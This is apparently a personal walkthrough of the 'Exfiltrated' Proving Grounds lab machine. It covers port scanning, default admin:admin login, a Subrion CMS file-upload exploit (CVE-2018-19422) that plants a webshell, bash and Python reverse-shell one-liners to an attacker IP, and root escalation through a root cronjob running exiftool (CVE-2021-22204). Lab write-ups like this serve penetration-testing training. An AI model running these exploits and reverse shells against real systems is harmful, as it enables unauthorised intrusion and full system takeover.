# Exfiltrated

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ rustscan -a 192.168.139.163
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.139.163:22
Open 192.168.139.163:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 08:33 EST
Initiating Ping Scan at 08:33
Scanning 192.168.139.163 [2 ports]
Completed Ping Scan at 08:33, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:33
Completed Parallel DNS resolution of 1 host. at 08:33, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:33
Scanning 192.168.139.163 [2 ports]
Discovered open port 22/tcp on 192.168.139.163
Discovered open port 80/tcp on 192.168.139.163
Completed Connect Scan at 08:33, 0.26s elapsed (2 total ports)
Nmap scan report for 192.168.139.163
Host is up, received syn-ack (0.26s latency).
Scanned at 2022-02-01 08:33:34 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -vv -sV -p 22,80 -A -O -sC 192.168.139.163
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 08:33 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 0.00s elapsed
Initiating Ping Scan at 08:33
Scanning 192.168.139.163 [4 ports]
Completed Ping Scan at 08:33, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:33
Completed Parallel DNS resolution of 1 host. at 08:33, 0.00s elapsed
Initiating SYN Stealth Scan at 08:33
Scanning 192.168.139.163 [2 ports]
Discovered open port 80/tcp on 192.168.139.163
Discovered open port 22/tcp on 192.168.139.163
Completed SYN Stealth Scan at 08:33, 0.29s elapsed (2 total ports)
Initiating Service scan at 08:33
Scanning 2 services on 192.168.139.163
Completed Service scan at 08:33, 6.54s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.139.163
Retrying OS detection (try #2) against 192.168.139.163
Initiating Traceroute at 08:33
Completed Traceroute at 08:33, 0.27s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:33
Completed Parallel DNS resolution of 2 hosts. at 08:33, 0.02s elapsed
NSE: Script scanning 192.168.139.163.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 7.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 1.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:33
Completed NSE at 08:33, 0.00s elapsed
Nmap scan report for 192.168.139.163
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2022-02-01 08:33:36 EST for 21s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
```

## 80 - Web

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.139.163 -v
*   Trying 192.168.139.163:80...
* Connected to 192.168.139.163 (192.168.139.163) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.139.163
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Tue, 01 Feb 2022 13:35:46 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=9ufhjmgvt1ak3oo25hihu0r1rd; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=9ufhjmgvt1ak3oo25hihu0r1rd; expires=Tue, 01-Feb-2022 14:05:46 GMT; Max-Age=1800; path=/
< Location: http://exfiltrated.offsec/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.139.163 left intact
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

Need ad a virtual host to `/etc/hosts`

![](Pasted%20image%2020220201213652.png)

### Logging in

Guessing credentials to be `admin`:`admin`

![](Pasted%20image%2020220201213949.png)

Works, and can access dashboard

![](Pasted%20image%2020220201214036.png)

![](Pasted%20image%2020220201214057.png)

# Exploit
https://www.google.com/search?q=Subrion+4.2&oq=Subrion+4.2&aqs=chrome..69i57.1994j0j7&sourceid=chrome&ie=UTF-8

https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE


```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE.git
Cloning into 'CVE-2018-19422-SubrionCMS-RCE'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (17/17), 59.27 KiB | 5.39 MiB/s, done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd CVE-2018-19422-SubrionCMS-RCE 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2018-19422-SubrionCMS-RCE]
└─$ python3 SubrionRCE.py                                                                                               
[+] Specify an url target
[+] Example usage: exploit.py -u http://target-uri/panel -l admin -p admin
[+] Example help usage: exploit.py -h
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2018-19422-SubrionCMS-RCE]
└─$ python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: RgXzfzDa81kZCs59LgOSIOH7ywmX1BkqNBzOlbHG
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: qtakozbgewkkksx

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qtakozbgewkkksx.phar 

$ whoami
www-data

$ /bin/bash -i >& /dev/tcp/192.168.49.139/11111 0>&1

$ ls /usr/bin | grep python
python3
python3.8

$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.139",11111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 11111
listening on [any] 11111 ...
connect to [192.168.49.139] from (UNKNOWN) [192.168.139.163] 52132
www-data@exfiltrated:/var/www/html/subrion/uploads$ cd /home
cd /home
www-data@exfiltrated:/home$ ls
ls
coaran
www-data@exfiltrated:/home$ cd coaran
cd coaran
www-data@exfiltrated:/home/coaran$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@exfiltrated:/home/coaran$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
coaran:x:1000:1000::/home/coaran:/bin/bash
www-data@exfiltrated:/home/coaran$ 
```


```
www-data@exfiltrated:/$ cd home
cd home
www-data@exfiltrated:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jun 10  2021 .
drwxr-xr-x 20 root   root   4096 Jan  7  2021 ..
drwx--x--x  2 coaran coaran 4096 Jun 10  2021 coaran
www-data@exfiltrated:/home$ cd coaran
cd coaran
www-data@exfiltrated:/home/coaran$ cat local.txt
cat local.txt
7f0bcad004c91d247ae8c0683fea611f
www-data@exfiltrated:/home/coaran$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@exfiltrated:/home/coaran$ 
```

![](Pasted%20image%2020220201215754.png)

# Privesc

## File Enumeration
```
www-data@exfiltrated:/home/coaran$ cd /var/www
cd /var/www
www-data@exfiltrated:/var/www$ ls
ls
html
www-data@exfiltrated:/var/www$ ls -al
ls -al
total 12
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 14 root root 4096 Jun 10  2021 ..
drwxr-xr-x  3 root root 4096 Jun 10  2021 html
www-data@exfiltrated:/var/www$ cd html
cd html
www-data@exfiltrated:/var/www/html$ ls
ls
subrion
www-data@exfiltrated:/var/www/html$ cd subrion
cd subrion
www-data@exfiltrated:/var/www/html/subrion$ ls
ls
CONTRIBUTING.md  changelog.txt  includes   license.txt  tmp
README.md        composer.json  index.php  modules      updates
admin            favicon.ico    install    robots.txt   uploads
backup           front          js         templates
www-data@exfiltrated:/var/www/html/subrion$ cd /
cd /
www-data@exfiltrated:/$ ls
ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
www-data@exfiltrated:/$ cd opt
cd opt
www-data@exfiltrated:/opt$ ls
ls
image-exif.sh  metadata
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
www-data@exfiltrated:/opt$ ls -al
ls -al
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata
www-data@exfiltrated:/opt$ cd metadata
cd metadata
www-data@exfiltrated:/opt/metadata$ ls
ls
www-data@exfiltrated:/opt/metadata$ 
```

## Scripts


Lse didn't pick up anything, but linenum

```
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#

```

## Cronjob

```
www-data@exfiltrated:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#
www-data@exfiltrated:/tmp$ 
```

## Exiftool

Found that it is possible to hack by gtfobins

But also got CVE

https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/


Random Testing


```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.49.139:8000/hacker.jpg
<ubrion/uploads$ wget 192.168.49.139:8000/hacker.jpg
--2022-02-01 14:35:57--  http://192.168.49.139:8000/hacker.jpg
Connecting to 192.168.49.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24064 (24K) [image/jpeg]
Saving to: ‘hacker.jpg’

hacker.jpg          100%[===================>]  23.50K  87.6KB/s    in 0.3s    

2022-02-01 14:35:58 (87.6 KB/s) - ‘hacker.jpg’ saved [24064/24064]

www-data@exfiltrated:/var/www/html/subrion/uploads$ file hacker.jpg
file hacker.jpg
hacker.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=1], baseline, precision 8, 200x200, components 3
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls /opt/metadata
ls /opt/metadata
3c3baf72ed
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /opt/metadata/3c3baf72ed
</html/subrion/uploads$ cat /opt/metadata/3c3baf72ed
ExifTool Version Number         : 11.88
File Name                       : hacker.jpg
Directory                       : /var/www/html/subrion/uploads
File Size                       : 24 kB
File Modification Date/Time     : 2022:02:01 14:32:58+00:00
File Access Date/Time           : 2022:02:01 14:35:58+00:00
File Inode Change Date/Time     : 2022:02:01 14:35:58+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Y Cb Cr Positioning             : Centered
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Warning                         : Error decoding CompressedAnnotation
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 200x200
Megapixels                      : 0.040
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls
ls
hacker.jpg  qtakozbgewkkksx.phar
www-data@exfiltrated:/var/www/html/subrion/uploads$ rm hacker.jpg
rm hacker.jpg
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls /opt/metadata
ls /opt/metadata
3c3baf72ed  8248754eef  b9781fc8b9  dc646bcc78  f860331cc3
```

## Actual Privesc CVE

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8000                           
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.139.163 - - [01/Feb/2022 09:19:08] "GET /linenum.sh HTTP/1.1" 200 -
192.168.139.163 - - [01/Feb/2022 09:34:03] "GET /hacker.jpg HTTP/1.1" 200 -
192.168.139.163 - - [01/Feb/2022 09:39:20] "GET /image.jpg HTTP/1.1" 200 -
```

https://www.google.com/search?q=exiftool+11.88+CVE&oq=exiftool+11.88+CVE&aqs=chrome..69i57.8007j0j7&sourceid=chrome&ie=UTF-8
https://github.com/convisolabs/CVE-2021-22204-exiftool

```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
Cloning into 'CVE-2021-22204-exiftool'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 27 (delta 6), reused 17 (delta 2), pack-reused 0
Receiving objects: 100% (27/27), 52.53 KiB | 7.50 MiB/s, done.
Resolving deltas: 100% (6/6), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd CVE-2021-22204-exiftool                                                                                          
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ ls           
configfile  exploit.py  image.jpg  lab  README.md
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ sed -i 's/127.0.0.1/192.168.49.139/g' exploit.py 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ ls -al exploit.py 
-rwxr-xr-x 1 kali kali 791 Feb  1 09:37 exploit.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ python3 exploit.py                                                                                                  
    1 image files updated
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ cp image.jpg ../                                    
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2021-22204-exiftool]
└─$ 
```

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.49.139:8000/image.jpg
<subrion/uploads$ wget 192.168.49.139:8000/image.jpg
--2022-02-01 14:41:15--  http://192.168.49.139:8000/image.jpg
Connecting to 192.168.49.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47577 (46K) [image/jpeg]
Saving to: ‘image.jpg’

image.jpg           100%[===================>]  46.46K  89.1KB/s    in 0.5s    

2022-02-01 14:41:16 (89.1 KB/s) - ‘image.jpg’ saved [47577/47577]

www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -al /opt/metadata
ls -al /opt/metadata
total 28
drwxr-xr-x 2 root root 4096 Feb  1 14:40 .
drwxr-xr-x 3 root root 4096 Jun 10  2021 ..
-rw-r--r-- 1 root root 1371 Feb  1 14:36 3c3baf72ed
-rw-r--r-- 1 root root 1371 Feb  1 14:39 8248754eef
-rw-r--r-- 1 root root 1371 Feb  1 14:40 b9781fc8b9
-rw-r--r-- 1 root root 1371 Feb  1 14:37 dc646bcc78
-rw-r--r-- 1 root root 1371 Feb  1 14:38 f860331cc3
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -al
ls -al
total 72
drwxr-xr-x  4 www-data www-data  4096 Feb  1 14:41 .
drwxr-xr-x 13 www-data www-data  4096 Jun 10  2021 ..
-rwxr-xr-x  1 www-data www-data   656 Jun 14  2018 .htaccess
drwxr-xr-x  2 www-data www-data  4096 Feb  1 13:42 .quarantine
drwxrwxrwx  2 www-data www-data  4096 Feb  1 13:42 .tmb
-rw-r--r--  1 www-data www-data 47577 Feb  1 14:38 image.jpg
-rw-r--r--  1 www-data www-data    31 Feb  1 13:42 qtakozbgewkkksx.phar
www-data@exfiltrated:/var/www/html/subrion/uploads$ 
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 9090                                                                                                                                                   1 ⨯
listening on [any] 9090 ...
connect to [192.168.49.139] from (UNKNOWN) [192.168.139.163] 46908
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# bash -p
exit
# ls
proof.txt
snap
# cat proof.txt
10cccd7395675f8f1dea14dbbca0ed0f
# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.139.163  netmask 255.255.255.0  broadcast 192.168.139.255
        ether 00:50:56:bf:fa:ef  txqueuelen 1000  (Ethernet)
        RX packets 143308  bytes 11484048 (11.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 145973  bytes 10987130 (10.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 610  bytes 48125 (48.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 610  bytes 48125 (48.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# 
```

![](Pasted%20image%2020220201224413.png)